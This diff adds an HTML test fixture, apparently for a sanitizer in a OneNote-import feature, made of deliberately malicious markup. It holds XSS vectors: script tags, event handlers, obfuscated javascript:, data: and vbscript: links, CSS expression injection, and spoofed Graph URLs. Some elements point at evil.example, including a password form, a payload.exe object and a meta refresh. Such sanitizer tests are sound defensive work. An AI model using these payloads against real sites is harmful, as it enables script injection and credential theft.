@@ -1,0 +1,27 @@
+<!-- Eigenes Beispiel (bösartig): Skripte, Eventhandler, javascript:-/data:-Links, CSS-Injection, fremde iframes/objects, SVG, Formulare, Kommentare, Meta-Refresh. Nichts davon darf ausführbar oder als Stil übrig bleiben. -->
+<html lang="en-US">
+<head><title>Evil</title><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"><style>body{background:url(javascript:alert(1))}</style><script>alert('head')</script></head>
+<body data-absolute-enabled="true" onload="alert('body')" style="font-family:Calibri;font-size:11pt">
+<script>alert(1)</script>
+<div data-id="_default" style="position:absolute;left:48px;top:120px;width:624px" onclick="alert(2)">
+<p onmouseover="alert(3)" style="color:red;position:fixed;top:0;left:0;z-index:99999;background-image:url(https://evil.example/x.png)">Overlay</p>
+<p style="color:expression(alert(4));background-color:url(javascript:alert(5));font-weight:bold;behavior:url(x.htc);-moz-binding:url(x.xml)">CSS</p>
+<p style="color:red;}&lt;/style&gt;&lt;script&gt;alert(6)&lt;/script&gt;">Escape</p>
+<p style="color:rgb(1,2,3) ;text-align:center !important; color : rgba(1, 2, 3, .5)">Werte</p>
+<p><a href="javascript:alert(7)">js</a> <a href=" JaVaScRiPt:alert(8)">js2</a> <a href="java&#x09;script:alert(9)">js3</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data</a> <a href="vbscript:msgbox(1)">vb</a> <a href="onenote:https://d.docs.live.net/abc/Notizbuch/Abschnitt.one#Seite&amp;section-id={1}&amp;page-id={2}">OneNote-Link</a> <a href="mailto:lehrer@example.org">Mail</a> <a href="https://example.org/&quot;onmouseover=&quot;alert(10)">quote</a> <a href="//evil.example/">protokollrelativ</a> <a href="/index.php/apps/files">relativ</a></p>
+<p><img src="x" onerror="alert(11)"><img src="https://graph.microsoft.com.evil.example/v1.0/me/onenote/resources/0-a!1-B!1/$value"><img src="https://graph.microsoft.com/v1.0/me/onenote/resources/../../../users/x/$value"><img src="https://graph.microsoft.com:444/v1.0/me/onenote/resources/0-a!1-B!2/$value"><img src="https://user@graph.microsoft.com/v1.0/me/onenote/resources/0-a!1-B!3/$value"><img src="http://graph.microsoft.com/v1.0/me/onenote/resources/0-a!1-B!4/$value"><img src="https://graph.microsoft.com/v1.0/me/onenote/resources/0-a%2F..!1-B!5/$value?x=1"><img src="data:image/svg+xml;base64,PHN2Zy8+"></p>
+<iframe src="javascript:alert(12)" data-original-src="javascript:alert(13)"></iframe>
+<iframe data-original-src="http://insecure.example/video"></iframe>
+<object data="https://evil.example/payload.exe" data-attachment="payload.exe" type="application/x-msdownload"></object>
+<embed src="https://evil.example/x.swf"><applet code="x"></applet>
+<svg onload="alert(14)"><script>alert(15)</script><a xlink:href="javascript:alert(16)"><text>svg</text></a></svg>
+<form action="https://evil.example/"><input name="pw" type="password"><button formaction="javascript:alert(17)">Senden</button><textarea>t</textarea></form>
+<!-- <script>alert(18)</script> -->
+<p>Ende <span style="font-family:Comic Sans MS;font-size:72pt;color:#123">Text</span> <span class="checklist-item" id="app" data-tag="to-do">kein Kästchen</span></p>
+<math><mtext>\href{javascript:alert(19)}{x}</mtext></math>
+<math><annotation encoding="application/x-tex">\href{javascript:alert(20)}{x}</annotation></math>
+<template><p>versteckt</p></template><noscript><p>noscript</p></noscript>
+<p><a href="https://example.org/" onclick="alert(21)" target="_top" style="color:blue">Ziel</a></p>
+</div>
+</body>
+</html>
